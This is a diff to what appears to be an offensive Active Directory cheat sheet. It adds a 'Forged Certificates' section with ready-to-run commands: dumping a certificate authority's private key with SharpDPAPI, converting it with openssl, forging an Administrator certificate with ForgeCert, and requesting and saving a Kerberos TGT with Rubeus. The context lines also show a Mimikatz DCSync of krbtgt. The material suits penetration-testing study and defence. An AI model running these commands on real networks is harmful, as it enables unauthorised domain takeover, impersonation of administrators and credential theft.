@@ -51,6 +51,7 @@
 * [Active Directory Certificate Services](#Active-Directory-Certificate-Services)
   * [Misconfigured Certificate Templates](#Misconfigured-Certificate-Templates)
   * [Relaying to ADCS HTTP Endpoints](#Relaying-to-ADCS-HTTP-Endpoints)
+  * [Forged Certificates](#Forged-Certificates)
 * [Cross Domain attacks](#Cross-Domain-attacks)
   * [Kerberoast](#Kerberoast)
   * [MS Exchange](#MS-Exchange)
@@ -1324,6 +1325,7 @@ ls \\<COMPOTERNAME FQDN>\C$
 - Save cert + key in a cert.pem file
 
 #### Transform cert to pfx
+- Set a password, password
 ```
 openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
 ```
@@ -1334,7 +1336,7 @@ cat cert.pfx | base64 -w 0
 .\Rubeus.exe asktgt /user:<USERNAME> /certificate:<BASE64 CERT> /password:password /aes256 /nowrap
 ```
 
-#### Rubeus write TGT kirbi
+#### Write TGT kirbi
 ```
 [System.IO.File]::WriteAllBytes("C:\Users\public\<USER>.kirbi", [System.Convert]::FromBase64String("<TICKET STRING>"))
 ```
@@ -1380,6 +1382,40 @@ runas /user:<DOMAIN>\<USER> /netonly cmd
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>"'
 ```
 
+### Forged Certificates
+#### Dump the private keys
+- Execute on the CA server. You can generally tell this is the private CA key because the Issuer and Subject are both set to the distinguished name of the CA.
+- https://github.com/GhostPack/SharpDPAPI
+```
+.\SharpDPAPI.exe certificates /machine
+```
+- Save cert + key in a cert.pem file
+
+#### Transform cert to pfx
+- Set a password, password
+```
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+```
+
+#### Create a forged certificate
+```
+.\ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword "password" --Subject "CN=User" --SubjectAltName "Administrator@<DOMAIN>" --NewCertPath fake.pfx --NewCertPassword "password"
+```
+
+#### Create a TGT
+```
+cat cert.pfx | base64 -w 0
+.\Rubeus.exe asktgt /user:Administrator /domain:<DOMAIN> /certificate:<BASE64 CERT> /password:password /nowrap
+```
+
+#### Write TGT kirbi
+```
+[System.IO.File]::WriteAllBytes("C:\Users\public\<USER>.kirbi", [System.Convert]::FromBase64String("<TICKET STRING>"))
+```
+ 
+#### Then load TGT and request TGS or access systems as this user.
+ 
+ 
 ## Child to Forest Root
 ### Trust key
 - Abuses SID History
